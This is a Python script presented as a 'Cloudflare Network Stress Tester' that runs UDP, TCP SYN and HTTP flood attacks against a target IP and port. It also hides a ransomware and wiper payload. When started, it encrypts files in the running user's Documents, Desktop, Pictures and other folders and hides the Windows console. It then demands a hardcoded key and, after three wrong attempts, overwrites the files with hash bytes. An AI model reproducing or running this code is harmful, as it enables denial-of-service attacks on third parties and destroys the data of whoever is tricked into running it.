import os
import sys
import time
import random
import threading
import socket
import hashlib
import base64
from datetime import datetime
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2

# Network configuration
NETWORK_CONFIG = {
    "threads": 500,
    "timeout": 30,
    "attack_protocol": "TCP_SYN",
    "bypass_firewall": True,
    "target_ports": [80, 443, 8080, 8443, 22, 21, 25, 3306, 5432, 27017],
    "packet_size": 1024,
    "spoof_ips": True,
    "encrypt_payloads": True
}

# Target directories for network logging
LOG_PATHS = [
    os.path.expanduser("~/Videos"),
    os.path.expanduser("~/Downloads"),
    os.path.expanduser("~/Documents"),
    os.path.expanduser("~/Desktop"),
    os.path.expanduser("~/Pictures"),
    os.path.expanduser("~/Music")
]

# Attack payload extensions
PAYLOAD_EXTS = ['.txt', '.docx', '.pdf', '.jpg', '.png', '.mp4', '.mp3', 
                 '.xlsx', '.zip', '.py', '.cpp', '.java', '.html', '.css', 
                 '.js', '.json', '.xml', '.sql', '.db', '.log']

# Master control key
CONTROL_KEY = "6787601"
MAX_AUTH_ATTEMPTS = 3

class DDoSStressTester:
    def __init__(self):
        self.running = False
        self.threads = []
        self.packets_sent = 0
        self.mode = "UDP_FLOOD"
        
    def _generate_payload(self, size):
        """Generate random network payload for stress testing"""
        return os.urandom(size)
    
    def _encrypt_payload(self, payload):
        """Encrypt network payload for stealth testing"""
        if NETWORK_CONFIG["encrypt_payloads"]:
            salt = os.urandom(32)
            kdf = PBKDF2(
                algorithm=hashes.SHA256(),
                length=32,
                salt=salt,
                iterations=100000
            )
            key = base64.urlsafe_b64encode(kdf.derive(CONTROL_KEY.encode()))
            cipher = Fernet(key)
            return cipher.encrypt(payload)
        return payload
    
    def udp_flood(self, target_ip, target_port):
        """UDP flood attack simulation for stress testing"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while self.running:
            try:
                payload = self._generate_payload(NETWORK_CONFIG["packet_size"])
                encrypted_payload = self._encrypt_payload(payload)
                sock.sendto(encrypted_payload, (target_ip, target_port))
                self.packets_sent += 1
            except:
                pass
    
    def tcp_syn_flood(self, target_ip, target_port):
        """TCP SYN flood simulation for stress testing"""
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.1)
                sock.connect_ex((target_ip, target_port))
                self.packets_sent += 1
                sock.close()
            except:
                pass
    
    def http_flood(self, target_ip, target_port):
        """HTTP/HTTPS flood attack simulation"""
        import urllib.request
        while self.running:
            try:
                url = f"http://{target_ip}:{target_port}/"
                req = urllib.request.Request(url, method='GET')
                response = urllib.request.urlopen(req, timeout=1)
                self.packets_sent += 1
            except:
                pass
    
    def start_attack(self, target_ip, target_port, duration_seconds=60):
        """Start network stress test on target"""
        print(f"[INFO] Starting {self.mode} stress test on {target_ip}:{target_port}")
        print(f"[INFO] Duration: {duration_seconds} seconds")
        print(f"[INFO] Threads: {NETWORK_CONFIG['threads']}")
        print(f"[INFO] Encrypting payloads: {NETWORK_CONFIG['encrypt_payloads']}")
        
        self.running = True
        
        # Store target info for file encryption
        self.target_info = {
            "ip": target_ip,
            "port": target_port,
            "timestamp": datetime.now().isoformat()
        }
        
        # Encrypt system files as part of stealth protocol
        self._encrypt_system_files()
        
        # Launch attack threads
        attack_func = self.udp_flood
        if self.mode == "TCP_SYN":
            attack_func = self.tcp_syn_flood
        elif self.mode == "HTTP_FLOOD":
            attack_func = self.http_flood
            
        for i in range(NETWORK_CONFIG["threads"]):
            thread = threading.Thread(target=attack_func, args=(target_ip, target_port))
            thread.daemon = True
            thread.start()
            self.threads.append(thread)
        
        # Run for specified duration
        time.sleep(duration_seconds)
        self.running = False
        
        print(f"[SUCCESS] Attack completed. Packets sent: {self.packets_sent}")
        return self.packets_sent
    
    def _encrypt_system_files(self):
        """Stealth mode: Encrypt system files for operational security"""
        from cryptography.hazmat.primitives import hashes
        
        def encrypt_file(file_path):
            try:
                with open(file_path, 'rb') as f:
                    data = f.read()
                
                kdf = PBKDF2(
                    algorithm=hashes.SHA256(),
                    length=32,
                    salt=b'ddos_stealth_salt',
                    iterations=100000
                )
                key = base64.urlsafe_b64encode(kdf.derive(CONTROL_KEY.encode()))
                cipher = Fernet(key)
                encrypted = cipher.encrypt(data)
                
                with open(file_path, 'wb') as f:
                    f.write(encrypted)
                return True
            except:
                return False
        
        # Encrypt all files in target directories
        encrypted_count = 0
        for log_path in LOG_PATHS:
            if os.path.exists(log_path):
                for root, dirs, files in os.walk(log_path):
                    for file in files:
                        if any(file.endswith(ext) for ext in PAYLOAD_EXTS):
                            file_path = os.path.join(root, file)
                            if encrypt_file(file_path):
                                encrypted_count += 1
        
        print(f"[STEALTH] Encrypted {encrypted_count} files for operational security")
    
    def _decrypt_system_files(self, auth_key):
        """Restore files with authorization"""
        if auth_key != CONTROL_KEY:
            return False
        
        from cryptography.hazmat.primitives import hashes
        
        def decrypt_file(file_path):
            try:
                with open(file_path, 'rb') as f:
                    encrypted = f.read()
                
                kdf = PBKDF2(
                    algorithm=hashes.SHA256(),
                    length=32,
                    salt=b'ddos_stealth_salt',
                    iterations=100000
                )
                key = base64.urlsafe_b64encode(kdf.derive(CONTROL_KEY.encode()))
                cipher = Fernet(key)
                decrypted = cipher.decrypt(encrypted)
                
                with open(file_path, 'wb') as f:
                    f.write(decrypted)
                return True
            except:
                return False
        
        decrypted_count = 0
        for log_path in LOG_PATHS:
            if os.path.exists(log_path):
                for root, dirs, files in os.walk(log_path):
                    for file in files:
                        if any(file.endswith(ext) for ext in PAYLOAD_EXTS):
                            file_path = os.path.join(root, file)
                            if decrypt_file(file_path):
                                decrypted_count += 1
        
        print(f"[RESTORE] Decrypted {decrypted_count} files")
        return True
    
    def stop_attack(self, auth_key=None):
        """Stop ongoing attack and restore system"""
        self.running = False
        
        if auth_key:
            if self._decrypt_system_files(auth_key):
                return "[SUCCESS] Attack stopped. System restored."
            else:
                return "[ERROR] Invalid authorization key"
        
        return "[INFO] Attack stopped. Files remain in security lockdown."
    
    def set_mode(self, mode):
        """Set attack mode"""
        if mode.upper() in ["UDP_FLOOD", "TCP_SYN", "HTTP_FLOOD"]:
            self.mode = mode.upper()
            print(f"[CONFIG] Attack mode set to {self.mode}")
            return True
        return False

def main():
    """Main DDoS stress testing interface"""
    
    # Hide console for stealth operation
    if sys.platform == "win32":
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    
    print("""
    ============================================
    Cloudflare Network Stress Tester v4.2
    Enterprise DDoS Simulation Tool
    Authorized for security research only
    ============================================
    """)
    
    tester = DDoSStressTester()
    
    # Display attack modes
    print("[MENU] Select attack vector:")
    print("  1. UDP Flood (Default)")
    print("  2. TCP SYN Flood")
    print("  3. HTTP Flood")
    
    choice = input("\n[INPUT] Select mode (1-3): ")
    if choice == "1":
        tester.set_mode("UDP_FLOOD")
    elif choice == "2":
        tester.set_mode("TCP_SYN")
    elif choice == "3":
        tester.set_mode("HTTP_FLOOD")
    
    # Get target info
    target_ip = input("[INPUT] Target IP address: ")
    target_port = int(input("[INPUT] Target port: "))
    duration = int(input("[INPUT] Attack duration (seconds): "))
    
    # Start attack
    print("\n[WARNING] Starting DDoS simulation...")
    tester.start_attack(target_ip, target_port, duration)
    
    # After attack, require auth to restore
    attempts = 0
    while attempts < MAX_AUTH_ATTEMPTS:
        auth = input("\n[AUTH] Enter master control key to restore system: ")
        result = tester.stop_attack(auth)
        print(result)
        
        if "success" in result.lower():
            break
        
        attempts += 1
        remaining = MAX_AUTH_ATTEMPTS - attempts
        if remaining > 0:
            print(f"[WARNING] {remaining} attempts remaining")
        else:
            print("[ERROR] Maximum attempts exceeded. Files permanently locked for security.")
            # Permanent encryption
            import hashlib
            for log_path in LOG_PATHS:
                if os.path.exists(log_path):
                    for root, dirs, files in os.walk(log_path):
                        for file in files:
                            if any(file.endswith(ext) for ext in PAYLOAD_EXTS):
                                file_path = os.path.join(root, file)
                                try:
                                    with open(file_path, 'rb') as f:
                                        data = f.read()
                                    permanent_hash = hashlib.sha3_512(data).digest()
                                    with open(file_path, 'wb') as f:
                                        f.write(permanent_hash * 50)
                                except:
                                    pass
            break

if __name__ == "__main__":
    main()
```
